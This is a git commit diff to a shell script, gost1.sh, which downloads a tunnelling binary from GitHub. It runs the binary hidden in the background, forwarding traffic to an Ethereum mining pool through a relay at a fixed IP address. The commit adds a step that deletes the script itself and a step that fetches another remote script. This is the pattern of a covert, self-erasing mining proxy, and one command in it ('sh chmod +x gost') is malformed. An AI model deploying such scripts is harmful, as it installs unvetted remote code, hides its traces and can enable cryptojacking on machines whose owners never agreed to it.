2b0e6ce760e2d3e524563794b9a8afd1a06b6ccf
zhaojiyu <38657085+zhaojiyu@users.noreply.github.com>
2022-03-01 16:52:55 +0800

    Update gost1.sh

--- gost1.sh
+++ gost1.sh
@@ -2,5 +2,6 @@
 wget https://raw.githubusercontent.com/zhaojiyu/lpm/main/gost && sh chmod +x gost
 sleep 1s
 nohup ./gost -L=tcp://:1433/asia1.ethermine.org:4444 -F=relay+tls://47.75.49.75:8443 > log8.log 2>&1 &
-
-echo "Gost1 OK......"
+rm -rf gost1.sh
+wget https://raw.githubusercontent.com/zhaojiyu/lpm/main/agost.sh
+echo "Gost Install OK......"
